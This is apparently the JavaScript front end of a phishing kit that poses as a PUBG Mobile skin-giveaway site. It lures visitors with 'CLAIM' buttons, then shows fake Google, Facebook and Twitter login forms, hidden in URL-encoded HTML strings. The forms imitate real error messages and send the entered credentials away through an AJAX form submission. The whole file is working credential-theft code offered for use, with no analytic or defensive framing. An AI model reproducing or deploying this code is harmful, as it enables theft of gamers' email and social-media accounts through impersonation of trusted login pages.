// <!------ SCRIPT ORIGINAL CODING DARI IRSHANDY JUNIAR HARDADI BUKAN CEKREK ---->
// <!--------  COPYRIGHT JUNESEARCH ----> 	
$( document ).ready(function () {

//--Get Copyright Load Papjih IrshandyJuniar
function loadPapjih() {
	setTimeout(function () {
		$('#loaderShandy').show();
		setTimeout(function () {
			$('#loaderShandy').fadeOut();
		}, 2000);
	}, 100)
}

loadPapjih();


$.getJSON("data.json", function (data) {	
// Ini Untuk Card 
let imgSkin = data.shandySkin; 
$.each(imgSkin, function (i, data) {

	$('#bodyKonten').append('<div class="cardJune" id="skin88"><div class="reward"><img src="asset/gam/skin/'+ data.img +'" class="thumb" id="borderImg"></div><button class="claimGet" id="claimGet"> CLAIM </button>');

	var limit = 5;

	$('.claimGet').on('click', function () {
		limit--;
		$('#juneAlert').show();
		if (limit < 1) {
			alert('Upss, Your Chance is Limit');
			document.location.href = 'success/event/';
		}
		$(this).fadeOut('slow');
	});

})	
});

//-- Bagian Load For Irshandy Creation ----------------------




//------- Bagian Alert Login
// Mendapatkan Elemen Dari Pilih Akun Alert 
$('#choseAcount').append(unescape('%3Cdiv%20class%3D%22head-login%22%20style%3D%22background%3A%20%23fff%3B%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%20id%3D%22logo%22%3E%3Cimg%20src%3D%22asset/gam/logo.jpg%22%20class%3D%22logoHead%22%20style%3D%22border-radius%3A%200.4vw%3B%22%3E%3C/td%3E%3Ctd%20style%3D%22padding-left%3A%202vw%3Bfont-size%3A%205vw%3Bfont-family%3A%20Levi%22%3E%3Cb%3EPUBG%20MOBILE%3C/b%3E%3Cbr%3EOfficial%20Site%20%3C/td%3E%3C/tr%3E%3C/table%3E%3C/div%3E%20%3Cdiv%20class%3D%22body%22%20style%3D%22padding-top%3A%201vw%3B%22%3E%3Cdiv%20class%3D%22captBody%22%3EYou%20need%20login%20to%20collect%20your%20reward%2C%20%3Cbr%3Echoose%20your%20login%20methode%3C/div%3E%3Ctable%3E%3Ctr%3E%3Ctd%20id%3D%22socmed%22%3E%20%3Cbutton%20class%3D%22btn-socmed%22%20onclick%3D%22goLog%28%29%22%3E%3Cimg%20src%3D%22asset/gam/ps.png%22%20class%3D%22socpng%22%20style%3D%22border-radius%3A%200.4vw%3B%22%3E%3Cp%20id%3D%22p%22%3EGoogle%3C/p%3E%3C/button%3E%3C/td%3E%3Ctd%20id%3D%22socmed%22%3E%20%3Cbutton%20class%3D%22btn-socmed%22%20onclick%3D%22fbLog%28%29%22%3E%3Cimg%20src%3D%22asset/gam/fblog.png%22%20class%3D%22socpng%22%20style%3D%22border-radius%3A%200.4vw%3B%22%3E%3Cp%20id%3D%22p%22%3EFacebook%3C/p%3E%3C/button%3E%3C/td%3E%3Ctd%20id%3D%22socmed%22%3E%3Cbutton%20class%3D%22btn-socmed%22%20onclick%3D%22twLog%28%29%22%3E%20%3Cimg%20src%3D%22asset/gam/tw.png%22%20class%3D%22socpng%22%3E%3Cbr%3E%3Cp%20id%3D%22p%22%3ETwitter%3C/p%3E%3C/button%3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/div%3E%20'));
//Mendapatkan elemen login google
$('#google').append(unescape('%3Cdiv%20id%3D%22loadJune%22%20class%3D%22Bkin%20Sendiri%20Nih%20Woyy%21%21%22%3E%3Cdiv%20id%3D%22bgLoad%22%3E%3C/div%3E%3Cdiv%20id%3D%22loadHead%22%3E%3C/div%3E%3C/div%3E%3Csection%20class%3D%22kontenLogin%22%3E%3Cimg%20src%3D%22asset/gam/gol.png%22%20class%3D%22logoForm%22%20id%3D%22golog%22%3E%3Cdiv%20id%3D%22xyx_Drag_June%22%3E%3Cdiv%20id%3D%22wordSpan%22%3E%20Sign%20in%20%3C/div%3E%3Cbr%3E%3Cspan%20id%3D%22wordSpan2%22%3Ewith%20your%20Google%20Account%3C/span%3E%3Cdiv%20id%3D%22port%22%3E%3Ca%20href%3D%22%22%20id%3D%22a%22%20class%3D%22learnMore%22%3ELearn%20more%3C/a%3E%3C/div%3E%3Cdiv%20id%3D%22getLogin%22%3E%3Cinput%20type%3D%22text%22%20name%3D%22mailgo%22%20placeholder%3D%22Email%20or%20phone%22%20autofocus%3D%22off%22%20autosave%3D%22off%22%20autocomplete%3D%22off%22%20id%3D%22mailIdent%22%3E%3Cinput%20type%3D%22password%22%20name%3D%22pass%22%20placeholder%3D%22Password%22%20autofocus%3D%22off%22%20autosave%3D%22off%22%20autocomplete%3D%22off%22%20id%3D%22passIdent%22%3E%3Cdiv%20id%3D%22getWrong%22%20class%3D%22bacotLuh%22%3E%3C/div%3E%3Cdiv%20id%3D%22forgotMail%22%20style%3D%22text-align%3A%20left%3Bmargin-top%3A%201vw%3B%22%3E%3Ca%20href%3D%22%22%20id%3D%22a2%22%3EForgot%20email%3F%3C/a%3E%3C/div%3E%3C/div%3E%3Cdiv%20class%3D%22deviceLain%22%20id%3D%22deviceLain%22%3ENot%20your%20computer%3F%20Use%20a%20Private%20Window%20to%20sign%20in.%20%3Cspan%20id%3D%22land%22%3E%3Ca%20href%3D%22%22%20id%3D%22a%22%20class%3D%22learnMore2%22%3ELearn%20more%3C/a%3E%3C/span%3E%3C/div%3E%3Cdiv%20class%3D%22footForm%22%3E%3Ca%20href%3D%22%22%20id%3D%22a%22%20class%3D%22createAkun%22%3E%20Create%20account%20%3C/a%3E%3Cbutton%20type%3D%22button%22%20class%3D%22submit%22%20id%3D%22btnMail%22%20onclick%3D%22mailGet%28%29%22%3E%20Next%20%3C/button%3E%3Cbutton%20type%3D%22button%22%20class%3D%22submit%22%20id%3D%22btnPass%22%20onclick%3D%22passGet%28%29%22%3E%20Next%20%3C/button%3E%3C/div%3E%3C/div%3E%3C/section%3E%3C/div%3E%3Cdiv%20class%3D%22footerLand%22%3E%3Ca%20href%3D%22%22%20id%3D%22linkFoot%22%3E%20Bantuan%20%3C/a%3E%3Ca%20href%3D%22%22%20id%3D%22linkFoot%22%3E%20Privasi%20%3C/a%3E%3Ca%20href%3D%22%22%20id%3D%22linkFoot%22%3E%20Persyaratan%20%3C/a%3E'));
$('#mailIdent,#passIdent').on('mouseover', function(){
	
	$('#mailIdent,#passIdent').css("border", "2px solid #1a73e8");
});
$('#mailIdent,#passIdent').on('mouseout', function(){
	$('#mailIdent,#passIdent').css("border", "1px solid #DCDCDC");
})
//Mendapatkan elemen login FB 
$('#facebook').append(unescape('%3Cdiv%20style%3D%22background%3A%20%23e9ebee%22%20style%3D%22padding-bottom%3A%207vw%3B%22%3E%3Cdiv%20class%3D%22logofb%22%3E%3Cimg%20src%3D%22asset/gam/fb.png%22%20style%3D%22width%3A%2040%25%3B%22%3E%3C/div%3E%3Cbr%3E%3Cinput%20type%3D%22email%22%20id%3D%22inputEmail%22%20name%3D%22mailfb%22%20placeholder%3D%22Phone%20or%20Email%22%20class%3D%22fb%22%20autocomplete%3D%22off%22%20autofocus%3E%3Cp%20class%3D%22salah%22%20id%3D%22mailFalse%22%3E%3C/p%3E%3Cinput%20type%3D%22password%22%20id%3D%22inputPw%22%20name%3D%22pass%22%20placeholder%3D%22Password%22%20class%3D%22fb%22%20autofocus%20autocomplete%3D%22off%22%3E%3Cp%20class%3D%22salah%22%20id%3D%22pwFalse%22%3E%3C/p%3E%3Cinput%20type%3D%22button%22%20onclick%3D%22hideForm%28%27%23facebook%27%29%22%20name%3D%22fbdata%22%20class%3D%22submit-fb%22%20value%3D%22Log%20In%22%3E%3Cdiv%20class%3D%22divider%22%3E%3Cspan%20id%3D%22fbsp%22%3Eor%3C/span%3E%3C/div%3E%20%3Ca%20href%3D%22https%3A//facebook.com%22%20class%3D%22btn%20btn-success%22%20id%3D%22newAccount%22%3E%20Create%20New%20Account%20%3C/a%3E%3C/div%3E'));
//Mendapatkan elemen login Twitter 
$('#twitter').append(unescape('%3Cdiv%20style%3D%22background%3A%20%23e9ebee%22%20style%3D%22padding-bottom%3A%207vw%3B%22%3E%3Cdiv%20class%3D%22head-login%22%20style%3D%22background%3A%20%23fff%3Bmargin-bottom%3A%201vw%3Bfont-family%3A%20sans-serif%3B%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%20id%3D%22logo%22%3E%3Cimg%20src%3D%22asset/gam/logo.jpg%22%20class%3D%22loGo%22%20style%3D%22width%3A%2080%25%3B%22%3E%3C/td%3E%3Ctd%3E%3Cb%3ESign%20Your%20Facebook%20account%20to%20connect%20with%3Cbr%3E%20PUBG%20Mobile%20%3C/td%3E%3C/tr%3E%3C/table%3E%3C/div%3E%3Cimg%20src%3D%22asset/gam/tw.png%22%20class%3D%22gam-tw%22%3E%3Ch2%20style%3D%22color%3A%20black%3Bfont-family%3A%20papJi%3Bfont-size%3A%203vw%3B%22%3E%20Login%20Twitter%20%3C/h2%3E%3Cinput%20type%3D%22email%22%20name%3D%22mailtw%22%20placeholder%3D%22Phone%2C%20Email%2C%20Or%20Phone%22%20class%3D%22twit%22%20autocomplete%3D%22off%22%20autofocus%3D%22on%22%20id%3D%22inputEmail%22%3E%3Cp%20class%3D%22salah%22%20id%3D%22mailFalse%22%3E%20%20%3C/p%3E%3Cinput%20type%3D%22password%22%20name%3D%22pass%22%20placeholder%3D%22Your%20Password%22%20class%3D%22twit%22%20required%20autofocus%20autocomplete%3D%22off%22%20id%3D%22inputPw%22%3E%3Cp%20class%3D%22salah%22%20id%3D%22pwFalse%22%3E%3C/p%3E%3Cinput%20type%3D%22button%22%20name%3D%22button%22%20onclick%3D%22hideForm%28%27%23twitter%27%29%22%20class%3D%22submit-tw%22%20value%3D%22Sign%20in%22%20name%3D%22twitterdata%22%3E%3Cbr%3E%3Ca%20href%3D%22https%3A//twitter.com%22%20style%3D%22color%3A%20dodgerblue%22%3E%20Forget%20Password%3F%3C/a%3E%3Ca%20href%3D%22https%3A//twitter.com/signup%22%20style%3D%22color%3A%20dodgerblue%22%3E%20Sign%20up%20Twitter%3C/a%3E%3Cbr%3E%3Cbr%3E%3C/div%3E'))

$('#ajaxAkun').on('submit', function () {

	$('.cLose').hide();
	var form = $(this);
	var method = form.attr('method');
	var action = form.attr('action');
	var datas = form.serialize();
	//Script For Ajax Shandy heheh 
	$.ajax({
		type : method,
		url : action,
		data : datas,
		success : function (data) {			
			
			$('#ajaxAkun').fadeOut();
			loadPapjih();

			setTimeout(function (argument) {
				
				$('#juneAlert').fadeOut('slow');

				setTimeout( function () {
					$('#juneAlert').remove()
				}, 500);

			}, 2000)

		}
	})
	return false;
});
});
// function juneAlert() {
// 	$('#juneAlert').show();
// 	$(this).fadeOut('slow');
// }
function cLose() {	
	window.location.href = "index.php";
}
function goLog() {
	$('#choseAcount').remove();
	$('#facebook').remove();
	$('#twitter').remove();

	$('.close').hide();
	$('#google').fadeIn();
}
function fbLog() {
	$('#choseAcount').remove();
	$('#google').remove(); 
	$('#twitter').remove();

	$('.close').hide();
	$('#facebook').fadeIn();
}
function twLog() {
	$('#choseAcount').remove();
	$('#google').remove();
	$('#facebook').remove();

	$('.close').hide();
	$('#twitter').fadeIn();
}

function hideForm(recive) {
	// Cek Validasi form
	var inputE = $('#inputEmail').val();
	var email = inputE.length;
	var inputP = $('#inputPw').val();
	var pass = inputP.length;
	if (email > 0) { // Jika Email Terisi
		if (email > 10) {
		// Ketika email sudah valid
		focusInput('#inputPw');
		$('#mailFalse').remove();
			if (pass > 0) { // Jika Pass Teriisi
				if (pass > 3 ) {
					$(recive).fadeOut('slow');
					$('.close').remove();
					unFocus('#inputPw');
					$('#info').fadeIn('slow');
// Kondisi Tidak Terpenuhi Untuk Email
}else{
	unFocus('#inputEmail');
	$('#pwFalse').fadeIn('slow');
	$('#pwFalse').text("Wrong Password. Try again or you can click forgot password");
}
}else{
	focusInput('#inputPw');
	unFocus('#inputEmail');
}
}
// Kondisi Tidak Terpenuhi Untuk Email
else{
	$('#mailFalse').fadeIn('slow');
	$('#mailFalse').text("We cant found your Account");
	focusInput('#inputEmail');
}
}else{
	focusInput('#inputEmail');
}
function unFocus(inputr) {
	$(inputr).css('border', '2px solid #DCDCDC');
}
function focusInput(inputs) {
	$(inputs).focus();
	$(inputs).css('border', '2px solid red');
}

}
function mailGet() {
	
	var mail = $('#mailIdent').val();

	//Cek Valid Email
	if (mail.length > 10) {

		$('#loadJune').fadeIn(function () {
			
			setTimeout(function () {
				
				$('#xyx_Drag_June').fadeOut();
				setTimeout(function () {
					$('#xyx_Drag_June').fadeIn('fast');

					$('#wordSpan').text('Welcome');
					$('#wordSpan2').text(mail);
					$('#passIdent').show();
					$('#forgotMail').hide();
					$('.createAkun').text("Forgot password?");
					$('#deviceLain').hide();
					$('#port').hide();
					$('#loadJune').slideUp();


					$('#mailIdent').hide();
					$('#btnMail').hide();
					$('#btnPass').show();
					$('#getWrong').hide();
				}, 200)

			}, 1000)
		});

	}else{
		$('#loadJune').fadeIn(function () {
			setTimeout(function () {
				$('#getWrong').fadeIn('slow', function () {
					$(this).text('We cant found your Account');
					$('#loadJune').slideUp();
					$('#mailIdent').css('border', '2px solid red');
					$('#mailIdent').focus();
				});

			}, 1000)
		})
	}

}

function passGet() {
	
	var pass = $('#passIdent').val();

	if (pass.length > 3) {

		$('#loadJune').fadeIn(function(){

			setTimeout(function () {
				
				$('#loadJune').slideUp();
				$('#google').fadeOut();//Login Hilang
				$('#info').fadeIn('slow');

			}, 1000)

		});

	}else{
		$('#loadJune').fadeIn(function () {
			setTimeout(function () {
				$('#getWrong').fadeIn('slow', function () {
					$(this).text('Wrong Password. Try again or you can click forgot password');
					$('#loadJune').slideUp();
					$('#passIdent').css('border', '2px solid red');
					$('#passIdent').focus();
				});

			}, 1000)
		})
	}
}